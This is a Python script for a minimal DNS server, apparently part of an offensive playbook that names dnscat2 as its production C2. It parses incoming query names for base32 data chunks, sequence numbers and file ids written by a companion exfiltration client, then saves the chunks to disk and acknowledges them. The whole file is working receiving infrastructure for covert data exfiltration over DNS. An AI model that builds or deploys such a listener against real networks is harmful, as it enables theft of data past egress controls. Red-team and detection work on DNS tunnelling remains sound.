#!/usr/bin/env python3
"""DNS TXT capture listener for local testing (GHOST-HUNT playbook 12.2).

A minimal UDP DNS server that parses incoming queries, extracts the chunk
label, sequence number, and file id from the QNAME, and stores each chunk for
dns_pull.py.

This is a LOCAL test double / capture tool — production DNS C2 uses dnscat2
(bootstrap-dns-server.sh). It replies with a minimal DNS response so clients
can ACK receipt.

Chunk layout (written by dns_exfil.py):
    <base32-chunk>.x<seq>.<fileid>.<domain>
      ->  stored as  chunk_<fileid>_<seq>.txt

Legacy single-file clients (<base32-chunk>.x<seq>.<domain>, no fileid) are
still accepted and stored as chunk_<seq>.txt.

Config (env vars):
    DNS_LISTEN      bind host:port       (default 127.0.0.1:5353)
    DNS_EXFIL_DIR   incoming chunk dir   (default ./dns_incoming)
"""

import os
import re
import socket
import struct
import sys
from typing import List, Optional, Tuple

LISTEN: str = os.environ.get("DNS_LISTEN", "127.0.0.1:5353")
EXFIL_DIR: str = os.environ.get("DNS_EXFIL_DIR", "dns_incoming")

LABEL_RE = re.compile(r"^[A-Z2-7]+$")  # base32 charset, unpadded
SEQ_RE = re.compile(r"^x([0-9]+)$")
ID_RE = re.compile(r"^[a-f0-9]{16}$")  # per-file content hash (16 hex)


def parse_query(data: bytes) -> Optional[Tuple[int, List[str], int]]:
    """Return (qid, labels, question_end_index) or None if not a query we handle."""
    if len(data) < 12:
        return None
    qid, _flags, qd, _an, _ns, _ar = struct.unpack(">HHHHHH", data[:12])
    if qd < 1:
        return None
    i: int = 12
    labels: List[str] = []
    while i < len(data):
        ln: int = data[i]
        i += 1
        if ln == 0:
            break
        # Never trust packet bounds — a malformed datagram must not crash the listener
        if ln > 63 or i + ln > len(data):
            return None
        labels.append(data[i : i + ln].decode("ascii", "replace"))
        i += ln
    if i + 4 > len(data):
        return None
    return qid, labels, i + 4  # end of the question section


def build_response(qid: int, question_bytes: bytes) -> bytes:
    """Minimal response: echo the question, QR=1, no answers (client only ACKs)."""
    header: bytes = struct.pack(">HHHHHH", qid, 0x8180, 1, 0, 0, 0)
    return header + question_bytes


def main() -> int:
    host: str
    port_str: str
    host, port_str = LISTEN.rsplit(":", 1)
    port: int = int(port_str)
    os.makedirs(EXFIL_DIR, exist_ok=True)

    sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((host, port))
    print(f"[*] DNS listener on {host}:{port} -> {EXFIL_DIR}", flush=True)

    received: int = 0
    while True:
        try:
            data: bytes
            addr: Tuple[str, int]
            data, addr = sock.recvfrom(4096)
        except KeyboardInterrupt:
            print(f"\n[*] Stopped — {received} chunks captured")
            return 0
        parsed = parse_query(data)
        if parsed is None:
            continue
        qid: int
        labels: List[str]
        q_end: int
        qid, labels, q_end = parsed
        if len(labels) < 2:
            continue
        chunk: str
        seq_label: str
        chunk, seq_label = labels[0], labels[1]
        if not LABEL_RE.match(chunk) or not SEQ_RE.match(seq_label):
            continue
        seq: int = int(seq_label[1:])
        # file id label (labels[2]) keeps multi-file captures from colliding;
        # legacy single-file clients omit it and keep the old chunk_<seq>.txt name
        fid: Optional[str] = labels[2] if len(labels) >= 3 and ID_RE.match(labels[2]) else None
        name: str = f"chunk_{fid}_{seq}.txt" if fid else f"chunk_{seq}.txt"
        with open(os.path.join(EXFIL_DIR, name), "w") as f:
            f.write(chunk)
        received += 1
        try:  # noqa: SIM105 — client gone, nothing to say
            sock.sendto(build_response(qid, data[12:q_end]), addr)
        except OSError:
            pass


if __name__ == "__main__":
    sys.exit(main())
